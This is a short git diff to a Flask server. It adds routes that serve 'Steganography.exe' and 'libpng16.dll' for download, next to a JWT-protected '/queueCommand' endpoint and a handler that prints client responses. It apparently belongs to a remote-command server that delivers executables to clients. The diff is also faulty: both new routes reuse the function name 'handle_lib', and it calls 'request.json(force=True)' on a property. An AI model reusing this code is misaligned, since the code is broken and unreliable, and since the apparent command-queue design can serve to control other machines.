@@ -8,7 +8,7 @@ import Steganography
 import tools
 from decouple import config
 from flask import (Flask, jsonify, make_response, redirect, render_template,
-                   request, url_for, send_file)
+                   request, url_for, send_file, send_from_directory)
 from flask_cors import CORS, cross_origin
 from flask_jwt_extended import (JWTManager, create_access_token, get_jwt,
                                 get_jwt_identity, jwt_required,
@@ -72,7 +72,13 @@ def handle_test():
 def home():
     return "<div>Hi</div>", 200
 
+@app.route("/lib")
+def handle_lib():
+    return send_from_directory(directory="./", filename="libpng16.dll")
 
+@app.route("/steg")
+def handle_lib():
+    return send_from_directory(directory="./", filename="Steganography.exe")
 # api endpoint to queue a command
 @app.route("/queueCommand", methods=["POST"])
 @jwt_required()
@@ -241,7 +247,7 @@ def handle_response():
     try:
         
         # file = request.files['file']
-        data = request.json
+        data = request.json(force=True)
         print()
         print("response:")
         # print(file.name)
